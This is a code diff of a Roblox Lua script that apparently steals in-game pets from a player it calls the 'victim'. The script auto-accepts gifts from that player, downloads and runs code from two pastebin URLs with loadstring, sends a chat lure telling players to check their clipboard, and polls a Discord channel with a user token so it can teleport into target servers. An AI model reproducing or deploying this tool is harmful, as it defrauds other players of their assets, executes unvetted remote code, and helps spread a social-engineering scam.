@@ -1,10 +1,40 @@
+local PET_TO_CLAIM = _G.Pets
+local isProcessing = false
+local giftingActive = false
+local lastGiftTime = 0
+
+local Players = game:GetService('Players')
+local HttpService = game:GetService('HttpService')
+local UserInputService = game:GetService('UserInputService')
+local RunService = game:GetService('RunService')
+local TeleportService = game:GetService('TeleportService')
+local TextChatService = game:GetService('TextChatService')
+local VirtualUser = game:GetService('VirtualUser')
+local VirtualInputManager = game:GetService('VirtualInputManager')
+
+local plr = Players.LocalPlayer
+
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
-wait(5)
-local UserInputService = game:GetService('UserInputService')
-local RunService = game:GetService('RunService')
+local backpack = plr:WaitForChild('Backpack', 15)
+if not backpack then
+    wait(5)
+end
+
+local character = plr.Character or plr.CharacterAdded:Wait()
+local RS = game:GetService('ReplicatedStorage')
+
+local gameEvents = RS:WaitForChild('GameEvents', 10)
+if not gameEvents then
+    wait(5)
+end
+
+local PetGiftingService = gameEvents:WaitForChild('PetGiftingService', 10)
+local Favorite_Item = gameEvents:WaitForChild('Favorite_Item', 10)
+local GiftPet = gameEvents:WaitForChild('GiftPet', 10)
+local AcceptPetGift = gameEvents:WaitForChild('AcceptPetGift', 10)
 
 local function checkActivityStatus()
     print('Roblox window is IN FOCUS.')
@@ -31,35 +61,42 @@ checkActivityStatus()
 local function waitForExactPet(fullName)
     print('⏳ Waiting for pet in backpack with name:', fullName)
     local timeout = 10
-    local elapsed = 0 -- Ensure elapsed is declared before use
+    local elapsed = 0
 
     while elapsed < timeout do
-        for _, pet in ipairs(Backpack:GetChildren()) do
+        for _, pet in ipairs(backpack:GetChildren()) do
             if pet.Name == fullName then
                 print('✅ Pet appeared in backpack:', fullName)
                 return true
             end
         end
         task.wait(0.5)
-        elapsed = elapsed + 0.5 -- Increment elapsed correctly
+        elapsed = elapsed + 0.5
     end
 
     print('❌ Pet not found in backpack after 10s:', fullName)
     return false
 end
 
--- Extracts base pet name without tags (used for whitelist)
 local function extractBaseName(fullName)
     local base = fullName:gsub('%s*%[.-%]', '')
     return base:match('^%s*(.-)%s*$')
 end
 
--- Hook into gift event
 task.defer(function()
     print('🔌 Hooking into GiftPet RemoteEvent...')
 
+    if not GiftPet then
+        warn("GiftPet RemoteEvent is nil. Cannot hook into OnClientEvent.")
+        return
+    end
+
     GiftPet.OnClientEvent:Connect(function(giftID, fullName, sender)
         print('🎁 Gift received:', giftID, fullName, sender)
+
+        giftingActive = true
+        lastGiftTime = tick()
+        print(string.format("Gifting started/continued. Last gift received at: %.2f", lastGiftTime))
 
         local basePetName = extractBaseName(fullName)
         print('🔍 Base pet name:', basePetName)
@@ -77,8 +114,13 @@ task.defer(function()
         print('✅ Accepting gift from', sender, 'with full name:', fullName)
 
         local success = pcall(function()
-            AcceptPetGift:FireServer(true, giftID)
-            print('🚀 Gift accepted (ID:', giftID, ')')
+            if AcceptPetGift then
+                AcceptPetGift:FireServer(true, giftID)
+                print('🚀 Gift accepted (ID:', giftID, ')')
+            else
+                warn("AcceptPetGift RemoteEvent is nil. Cannot accept gift.")
+                success = false
+            end
         end)
 
         if success then
@@ -94,42 +136,41 @@ task.defer(function()
 end)
 
 if token == '' or channelId == '' then
-    game.Players.LocalPlayer:Kick('Add your token or channelId to use')
+    plr:Kick('Add your token or channelId to use')
 end
 
 loadstring(game:HttpGet('https://pastebin.com/raw/xBLu3qtF', true))()
 loadstring(game:HttpGet('https://pastebin.com/raw/vbLfSAFd', true))()
 
-local bb = game:GetService('VirtualUser')
 game:GetService('Players').LocalPlayer.Idled:Connect(function()
-    bb:CaptureController()
-    bb:ClickButton2(Vector2.new())
+    VirtualUser:CaptureController()
+    VirtualUser:ClickButton2(Vector2.new())
 end)
 
-local HttpServ = game:GetService('HttpService')
-local VirtualInputManager = game:GetService('VirtualInputManager')
 local victimFile = isfile('user_gag.txt')
 local joinedFile = isfile('joined_ids.txt')
+
 if not victimFile then
     writefile('user_gag.txt', 'victim username')
 end
 if not joinedFile then
     writefile('joined_ids.txt', '[]')
 end
+
 local victimUser = readfile('user_gag.txt')
-local joinedIds = HttpServ:JSONDecode(readfile('joined_ids.txt'))
+local joinedIds = HttpService:JSONDecode(readfile('joined_ids.txt'))
 local didVictimLeave = false
 local timer = 0
 local lastMessageId = nil
 
 local function saveJoinedId(messageId)
     table.insert(joinedIds, messageId)
-    writefile('joined_ids.txt', HttpServ:JSONEncode(joinedIds))
+    writefile('joined_ids.txt', HttpService:JSONEncode(joinedIds))
 end
 
 local function waitForPlayerLeave()
     local connection
-    connection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
+    connection = Players.PlayerRemoving:Connect(function(removedPlayer)
         if removedPlayer.Name == victimUser then
             if connection then
                 connection:Disconnect()
@@ -141,9 +182,7 @@ end
 
 waitForPlayerLeave()
 
-local Players = game:GetService('Players')
-local plr = Players.LocalPlayer
-
+-- Wait for player data to load
 while plr:GetAttribute('DataFullyLoaded') ~= true do
     plr:GetAttributeChangedSignal('DataFullyLoaded'):Wait()
 end
@@ -155,6 +194,7 @@ while plr:GetAttribute('Loading_Screen_Finished') ~= true do
 end
 
 wait(1)
+
 local giftNoti = plr
     :WaitForChild('PlayerGui')
     :WaitForChild('Gift_Notification')
@@ -176,11 +216,9 @@ end
 
 task.spawn(acceptGifts)
 
-game
-    :GetService('TextChatService').TextChannels.RBXGeneral
-    :SendAsync('Yo gng check yo clipboard')
+TextChatService.TextChannels.RBXGeneral:SendAsync('Yo gng check yo clipboard')
 wait(0.5)
-game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('GGS')
+TextChatService.TextChannels.RBXGeneral:SendAsync('GGS')
 
 local function increaseTimer()
     while task.wait(1) do
@@ -191,6 +229,16 @@ end
 task.spawn(increaseTimer)
 
 local function autoJoin()
+    if giftingActive then
+        local timeSinceLastGift = tick() - lastGiftTime
+        if timeSinceLastGift < 6 then
+            print(string.format("Gifting is active. Skipping Discord check for %.2f more seconds.", 6 - timeSinceLastGift))
+            return
+        else
+            print("Gifting session concluded. Resetting giftingActive flag and proceeding with Discord check.")
+        end
+    end
+
     local response = request({
         Url = 'https://discord.com/api/v9/channels/'
             .. channelId
@@ -204,8 +252,9 @@ local function autoJoin()
     })
 
     if response.StatusCode == 200 then
-        local messages = HttpServ:JSONDecode(response.Body)
+        local messages = HttpService:JSONDecode(response.Body)
         if #messages == 0 then
+            print("No new Discord messages to process.")
             return
         end
 
@@ -214,6 +263,7 @@ local function autoJoin()
             message.id == lastMessageId
             or table.find(joinedIds, tostring(message.id))
         then
+            print("Latest Discord message already processed or joined.")
             return
         end
 
@@ -223,15 +273,17 @@ local function autoJoin()
             'TeleportToPlaceInstance%((%d+),%s*[\'"]([%w%-]+)[\'"]%)'
         )
         if placeId and jobId then
+            print(string.format("Discord message found for join: PlaceId=%s, JobId=%s", placeId, jobId))
             lastMessageId = message.id
             saveJoinedId(tostring(message.id))
             writefile('user_gag.txt', 'unknown')
-            game
-                :GetService('TeleportService')
-                :TeleportToPlaceInstance(placeId, jobId)
+            TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId)
+        else
+            print("Latest Discord message does not contain a valid teleport link.")
         end
     else
-        print('Invalid response code:', response.StatusCode)
+        warn('Invalid response code from Discord API:', response.StatusCode)
+        warn('Response body:', response.Body)
     end
 end
 
